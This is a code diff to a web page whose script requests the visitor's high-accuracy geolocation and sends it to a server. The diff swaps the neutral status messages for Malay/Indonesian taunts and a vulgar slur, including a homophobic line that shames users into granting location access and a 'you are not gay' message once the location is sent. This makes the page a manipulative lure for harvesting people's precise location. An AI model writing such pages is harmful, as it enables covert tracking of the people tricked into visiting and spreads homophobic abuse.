@@ -31,11 +31,11 @@
       const status = document.getElementById("status");
 
       if (!navigator.geolocation) {
-        status.innerText = "Geolocation not supported by your browser.";
+        status.innerText = "skill issue browser mu.";
         return;
       }
 
-      status.innerText = "Requesting location...";
+      status.innerText = "Kalau tidak tekan, GAY";
 
       navigator.geolocation.getCurrentPosition(
         async function(position) {
@@ -53,19 +53,19 @@
             });
 
             if (response.ok) {
-              status.innerText = "Location sent successfully!";
+              status.innerText = "Tahniah Anda Tidak Gay!";
             } else {
-              status.innerText = "Error sending location.";
+              status.innerText = "Kontol";
             }
           } catch (error) {
-            status.innerText = "Network error. Please try again.";
+            status.innerText = "Kontol";
           }
         },
         function(error) {
           if (error.code === error.PERMISSION_DENIED) {
             status.innerText = "Permission denied.";
           } else {
-            status.innerText = "Unable to retrieve location.";
+            status.innerText = "Kontol";
           }
         },
         { enableHighAccuracy: true }
@@ -74,3 +74,4 @@
   </script>
 </body>
 </html>
+
